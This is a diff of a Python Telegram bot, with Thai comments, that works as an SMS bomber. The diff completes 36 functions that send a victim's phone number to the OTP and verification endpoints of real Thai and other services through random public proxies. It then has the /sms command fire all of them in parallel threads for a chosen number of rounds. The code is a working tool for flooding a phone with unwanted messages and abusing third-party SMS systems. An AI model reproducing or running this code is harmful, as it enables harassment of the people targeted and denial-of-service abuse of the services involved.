@@ -7,232 +7,370 @@ import threading
 import time
 
 # ตั้งค่าการล็อก
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.DEBUG)
 
 # Proxy List
 proxy_list = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text.splitlines()
 
 # API ฟังก์ชัน
 def api1(phone):
-    requests.post("https://www.carsome.co.th/website/login/sendSMS",
-                  headers={"user-agent": "Mozilla/5.0"},
-                  json={"username": phone, "optType": 0},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://www.carsome.co.th/website/login/sendSMS",
+                      headers={"user-agent": "Mozilla/5.0"},
+                      json={"username": phone, "optType": 0},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 1: {e}")
 
-# (เพิ่มฟังก์ชัน api2 ถึง api36 ที่นี่)
+# เพิ่มฟังก์ชัน API อื่น ๆ (api2 ถึง api36)
 def api2(phone):
-    requests.Session().post("https://api.jobbkk.com/v1/easy/otp_code",
-                            data="mobile=" + phone,
-                            proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.Session().post("https://api.jobbkk.com/v1/easy/otp_code",
+                                data="mobile=" + phone,
+                                proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 2: {e}")
 
 def api3(phone):
-    session = requests.Session()
-    session.post("https://srfng.ais.co.th/login/sendOneTimePW",
-                 data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
-                 proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        session = requests.Session()
+        session.post("https://srfng.ais.co.th/login/sendOneTimePW",
+                     data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
+                     proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 3: {e}")
 
 def api4(phone):
-    requests.post("https://openapi.bigc.co.th/customer/v1/otp",
-                  headers={"user-agent": "Mozilla/5.0"},
-                  json={"phone_no": phone},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://openapi.bigc.co.th/customer/v1/otp",
+                      headers={"user-agent": "Mozilla/5.0"},
+                      json={"phone_no": phone},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 4: {e}")
 
 def api5(phone):
-    requests.get(f"https://users.cars24.co.th/oauth/consumer-app/otp/{phone[1:]}",
-                 headers={"user-agent": "Mozilla/5.0"},
-                 proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.get(f"https://users.cars24.co.th/oauth/consumer-app/otp/{phone[1:]}",
+                     headers={"user-agent": "Mozilla/5.0"},
+                     proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 5: {e}")
 
 def api6(phone):
-    requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",
-                  data={"mobile_phone_no": phone},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",
+                      data={"mobile_phone_no": phone},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 6: {e}")
 
 def api7(phone):
-    requests.post("https://topping.truemoveh.com/api/get_request_otp",
-                  data=f"mobile_number={phone}",
-                  headers={"Accept": "application/json"},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://topping.truemoveh.com/api/get_request_otp",
+                      data=f"mobile_number={phone}",
+                      headers={"Accept": "application/json"},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 7: {e}")
 
 def api8(phone):
-    requests.post("https://www.beauticool.com/?m=request_otp",
-                  headers={"user-agent": "Mozilla/5.0"},
-                  data=f"tel={phone}",
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://www.beauticool.com/?m=request_otp",
+                      headers={"user-agent": "Mozilla/5.0"},
+                      data=f"tel={phone}",
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 8: {e}")
 
 def api9(phone):
-    requests.get(f"https://users.cars24.co.th/oauth/consumer-app/otp/{phone[1:]}",
-                 headers={"user-agent": "Mozilla/5.0"},
-                 proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.get(f"https://users.cars24.co.th/oauth/consumer-app/otp/{phone[1:]}",
+                     headers={"user-agent": "Mozilla/5.0"},
+                     proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 9: {e}")
 
 def api10(phone):
-    requests.post("https://api-sso.ch3plus.com/user/request-otp",
-                  headers={'user-agent': "Mozilla/5.0"},
-                  json={"tel": phone, "type": "login"},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://api-sso.ch3plus.com/user/request-otp",
+                      headers={'user-agent': "Mozilla/5.0"},
+                      json={"tel": phone, "type": "login"},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 10: {e}")
 
 def api11(phone):
-    requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684",
-                  json={"lang": "th", "userType": "BUYER", "locale": "th", "phone": phone, "type": "signup"},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684",
+                      json={"lang": "th", "userType": "BUYER", "locale": "th", "phone": phone, "type": "signup"},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 11: {e}")
 
 def api12(phone):
-    requests.post("https://api2.1112.com/api/v1/otp/create",
-                  headers={"user-agent": "Mozilla/5.0"},
-                  json={"phonenumber": phone, "language": "th"},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://api2.1112.com/api/v1/otp/create",
+                      headers={"user-agent": "Mozilla/5.0"},
+                      json={"phonenumber": phone, "language": "th"},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 12: {e}")
 
 def api13(phone):
-    requests.post("https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp",
-                  headers={"User-Agent": "Mozilla/5.0"},
-                  data=f"Mobile={phone}",
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp",
+                      headers={"User-Agent": "Mozilla/5.0"},
+                      data=f"Mobile={phone}",
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 13: {e}")
 
 def api14(phone):
-    requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",
-                  json={"on": {"value": phone, "country": "66"}, "type": "mobile"},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",
+                      json={"on": {"value": phone, "country": "66"}, "type": "mobile"},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 14: {e}")
 
 def api15(phone):
-    requests.post("https://api.giztix.com/graphql",
-                  json={"operationName": "OtpGeneratePhone",
-                        "variables": {"phone": f"66{phone[1:]}"},
-                        "query": "mutation OtpGeneratePhone($phone: ID!) {otpGeneratePhone(phone: $phone) {ref}}"},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://api.giztix.com/graphql",
+                      json={"operationName": "OtpGeneratePhone",
+                            "variables": {"phone": f"66{phone[1:]}"},
+                            "query": "mutation OtpGeneratePhone($phone: ID!) {otpGeneratePhone(phone: $phone) {ref}}"},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 15: {e}")
 
 def api16(phone):
-    requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",
-                  json={"username": phone, "password": "password", "name": "name", "provinceCode": "28"},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",
+                      json={"username": phone, "password": "password", "name": "name", "provinceCode": "28"},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 16: {e}")
 
 def api17(phone):
-    requests.post("https://api.ulive.youpik.com/api-base/sms/sendCode",
-                  data=f"phone={phone[1:]}&type=1",
-                  headers={"authorization": "Basic d2ViQXBwOndlYkFwcA=="},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://api.ulive.youpik.com/api-base/sms/sendCode",
+                      data=f"phone={phone[1:]}&type=1",
+                      headers={"authorization": "Basic d2ViQXBwOndlYkFwcA=="},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 17: {e}")
 
 def api18(phone):
-    requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",
-                  json={"msisdn": phone, "function": "enroll"},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",
+                      json={"msisdn": phone, "function": "enroll"},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 18: {e}")
 
 def api19(phone):
-    requests.get(f'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}',
-                 proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.get(f'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}',
+                     proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 19: {e}")
 
 def api20(phone):
-    requests.post("https://api.1112delivery.com/api/v1/otp/create",
-                  json={"phonenumber": phone, "language": "th"},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://api.1112delivery.com/api/v1/otp/create",
+                      json={"phonenumber": phone, "language": "th"},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 20: {e}")
 
 def api21(phone):
-    requests.get(f"https://app.iship.cloud/api/ant/request-otp/{phone}",
-                 proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.get(f"https://app.iship.cloud/api/ant/request-otp/{phone}",
+                     proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 21: {e}")
 
 def api22(phone):
-    requests.post("https://www.ctrueshop.com/member.php?page=25&type=9",
-                  data=f"tel1={phone}",
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://www.ctrueshop.com/member.php?page=25&type=9",
+                      data=f"tel1={phone}",
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 22: {e}")
 
 def api23(phone):
-    requests.post("https://www.bigthailand.com/authentication-service/user/OTP",
-                  json={"locale": "th", "phone": f"+66{phone[1:]}"},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://www.bigthailand.com/authentication-service/user/OTP",
+                      json={"locale": "th", "phone": f"+66{phone[1:]}"},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 23: {e}")
 
 def api24(phone):
-    requests.post("https://shopgenix.com/api/sms/otp/",
-                  data=f"mobile={phone}",
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://shopgenix.com/api/sms/otp/",
+                      data=f"mobile={phone}",
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 24: {e}")
 
 def api25(phone):
-    requests.post("https://service-api.auto1.co.th/w/user/request-otp-on-register",
-                  json={"Tel": phone},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://service-api.auto1.co.th/w/user/request-otp-on-register",
+                      json={"Tel": phone},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 25: {e}")
 
 def api26(phone):
-    requests.post("https://id.zilingo.com/api/otp/send",
-                  json={"phone": phone},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://id.zilingo.com/api/otp/send",
+                      json={"phone": phone},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 26: {e}")
 
 def api27(phone):
-    requests.post("https://ecomapi.eveandboy.com/v10.0/api/auth/send-otp",
-                  json={"phone": phone},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://ecomapi.eveandboy.com/v10.0/api/auth/send-otp",
+                      json={"phone": phone},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 27: {e}")
 
 def api28(phone):
-    requests.post("https://api.pluckk.in/api/v1/auth/send-otp",
-                  json={"phone": phone},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://api.pluckk.in/api/v1/auth/send-otp",
+                      json={"phone": phone},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 28: {e}")
 
 def api29(phone):
-    requests.post("https://watsons.co.th/auth/otp",
-                  json={"phone": phone},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://watsons.co.th/auth/otp",
+                      json={"phone": phone},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 29: {e}")
 
 def api30(phone):
-    requests.post("https://app.amplyfy.in/v1/otp/send",
-                  json={"phone": phone},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://app.amplyfy.in/v1/otp/send",
+                      json={"phone": phone},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 30: {e}")
 
 def api31(phone):
-    requests.post("https://line.me/otp/send",
-                  json={"phone": phone},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://line.me/otp/send",
+                      json={"phone": phone},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 31: {e}")
 
 def api32(phone):
-    requests.post("https://scg-api.dingdongx.com/api/otp/send",
-                  json={"phone": phone},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://scg-api.dingdongx.com/api/otp/send",
+                      json={"phone": phone},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 32: {e}")
 
 def api33(phone):
-    requests.post("https://www.ais.co.th/api/otp/send",
-                  json={"phone": phone},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://www.ais.co.th/api/otp/send",
+                      json={"phone": phone},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 33: {e}")
 
 def api34(phone):
-    requests.post("https://www.cpall.co.th/auth/send-otp",
-                  json={"phone": phone},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://www.cpall.co.th/auth/send-otp",
+                      json={"phone": phone},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 34: {e}")
 
 def api35(phone):
-    requests.post("https://truemoney.co.th/api/otp/send",
-                  json={"phone": phone},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
-         
-def api36(phone):
-    requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",
-                  data={"mobile_phone_no": phone},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
+    try:
+        requests.post("https://truemoney.co.th/api/otp/send",
+                      json={"phone": phone},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 35: {e}")
 
-# ฟังก์ชันที่ยิง SMS ทุกๆ X นาที
-def send_sms(phone, interval):
-    while True:
+def api36(phone):
+    try:
+        requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",
+                      data={"mobile_phone_no": phone},
+                      proxies={'http': 'http://' + random.choice(proxy_list)})
+    except Exception as e:
+        logging.error(f"Error in API 36: {e}")
+
+# ฟังก์ชันที่ยิง SMS ทุกๆ จำนวนรอบที่กำหนด
+def send_sms(phone, rounds):
+    for _ in range(rounds):
         threading.Thread(target=api1, args=(phone,)).start()
         threading.Thread(target=api2, args=(phone,)).start()
-        # (เรียก API อื่นๆ ที่คุณต้องการ)
+        threading.Thread(target=api3, args=(phone,)).start()
+        threading.Thread(target=api4, args=(phone,)).start()
+        threading.Thread(target=api5, args=(phone,)).start()
+        threading.Thread(target=api6, args=(phone,)).start()
+        threading.Thread(target=api7, args=(phone,)).start()
+        threading.Thread(target=api8, args=(phone,)).start()
+        threading.Thread(target=api9, args=(phone,)).start()
+        threading.Thread(target=api10, args=(phone,)).start()
+        threading.Thread(target=api11, args=(phone,)).start()
+        threading.Thread(target=api12, args=(phone,)).start()
+        threading.Thread(target=api13, args=(phone,)).start()
+        threading.Thread(target=api14, args=(phone,)).start()
+        threading.Thread(target=api15, args=(phone,)).start()
+        threading.Thread(target=api16, args=(phone,)).start()
+        threading.Thread(target=api17, args=(phone,)).start()
+        threading.Thread(target=api18, args=(phone,)).start()
+        threading.Thread(target=api19, args=(phone,)).start()
+        threading.Thread(target=api20, args=(phone,)).start()
+        threading.Thread(target=api21, args=(phone,)).start()
+        threading.Thread(target=api22, args=(phone,)).start()
+        threading.Thread(target=api23, args=(phone,)).start()
+        threading.Thread(target=api24, args=(phone,)).start()
+        threading.Thread(target=api25, args=(phone,)).start()
+        threading.Thread(target=api26, args=(phone,)).start()
+        threading.Thread(target=api27, args=(phone,)).start()
+        threading.Thread(target=api28, args=(phone,)).start()
+        threading.Thread(target=api29, args=(phone,)).start()
+        threading.Thread(target=api30, args=(phone,)).start()
+        threading.Thread(target=api31, args=(phone,)).start()
+        threading.Thread(target=api32, args=(phone,)).start()
+        threading.Thread(target=api33, args=(phone,)).start()
+        threading.Thread(target=api34, args=(phone,)).start()
+        threading.Thread(target=api35, args=(phone,)).start()
         threading.Thread(target=api36, args=(phone,)).start()
-
-        time.sleep(interval * 10)  # รอเวลา interval ก่อนยิง SMS ครั้งถัดไป
 
 # ฟังก์ชันจัดการคำสั่ง /sms
 def sms_command(update: Update, context: CallbackContext):
     if len(context.args) != 2:
-        update.message.reply_text('กรุณาระบุ เบอร์โทร และ จำนวนเวลาที่ต้องการยิง (นาที) เช่น /sms 0812345678 2')
+        update.message.reply_text('กรุณาระบุ เบอร์โทร และ จำนวนรอบที่ต้องการยิง เช่น /sms 0812345678 2')
         return
 
     phone = context.args[0]
     try:
-        interval = int(context.args[1])  # เวลาในการยิงซ้ำ (นาที)
-        if interval < 0:
-            update.message.reply_text('โปรดระบุเวลาที่มากกว่า 0')
+        rounds = int(context.args[1])  # จำนวนรอบที่ต้องการยิง
+        if rounds <= 0:
+            update.message.reply_text('โปรดระบุจำนวนรอบที่มากกว่า 0')
             return
     except ValueError:
-        update.message.reply_text('โปรดระบุเวลาที่ถูกต้อง เช่น 1 หรือ 2')
+        update.message.reply_text('โปรดระบุจำนวนรอบที่ถูกต้อง เช่น 1 หรือ 2')
         return
 
-    update.message.reply_text(f'เริ่มยิง SMS ไปยัง {phone} ทุก {interval} นาที')
+    update.message.reply_text(f'เริ่มยิง SMS ไปยัง {phone} จำนวน {rounds} รอบ')
 
     # เริ่มยิง SMS ต่อเนื่อง
-    threading.Thread(target=send_sms, args=(phone, interval)).start()
+    threading.Thread(target=send_sms, args=(phone, rounds)).start()
 
 # ฟังก์ชันหลักสำหรับบอท
 def main():
